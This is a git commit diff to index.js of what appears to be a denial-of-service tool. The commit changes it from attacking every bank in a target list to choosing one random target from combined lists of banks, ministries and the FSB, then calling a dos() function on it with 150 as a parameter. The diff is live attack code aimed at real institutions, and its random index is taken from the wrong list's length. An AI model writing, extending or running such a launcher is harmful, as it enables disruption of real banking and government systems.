28eb248ba1dffa73d7008895b9e7d07383bba198
rchomko <romanmediapr@gmail.com>
2022-02-28 16:22:50 +0200

    Random selection of a single target

--- index.js
+++ index.js
@@ -1,10 +1,20 @@
 const { dos } = require("./controllers/ddos.js");
-const banks = require("./targets/banks.json");
-const allowedPorts = [80, 8080, 443];
 
-banks
-  .filter(({ port }) => allowedPorts.includes(port))
-  .map(({ ip_str, port }) => {
-    const protocol = port === 443 ? "https://" : "http://";
-    dos(`${protocol}${ip_str}:${port}`, 150, 0);
-  });
+const banks = require("./targets/banks.json");
+const ministries = require("./targets/ministries.json");
+const fsb = require("./targets/fsb.json");
+
+const jointTargets = [...banks, ...ministries, ...fsb];
+
+const index = Math.floor(Math.random() * (jointTargets.length - 1));
+
+const allowedPorts = [80, 8080, 443];
+const filteredTargets = jointTargets.filter(({ port }) =>
+  allowedPorts.includes(port)
+);
+
+const { ip_str, port } = filteredTargets[index];
+
+const protocol = port === 443 ? "https://" : "http://";
+
+dos(`${protocol}${ip_str}`, 150, 0);
